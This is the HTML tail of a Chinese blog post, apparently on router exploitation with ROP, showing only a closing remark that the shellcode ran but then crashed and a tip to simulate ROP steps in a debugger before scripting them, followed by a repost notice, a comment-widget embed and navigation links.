+<p>可以执行完毕 <code>shellcode</code> , 不过执行完后就异常了。神奇。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在调试rop时可以先在调试器中修改寄存器，内存数据来模拟实现，然后在写到脚本里面。</p>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a> 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html">http://jinyu00.github.io/路由器安全/2017-10-28-一步一步pwn路由器之rop技术实战.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/路由器安全/2017-10-27-MIPS-rop-gadgets记录贴-持续更新.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
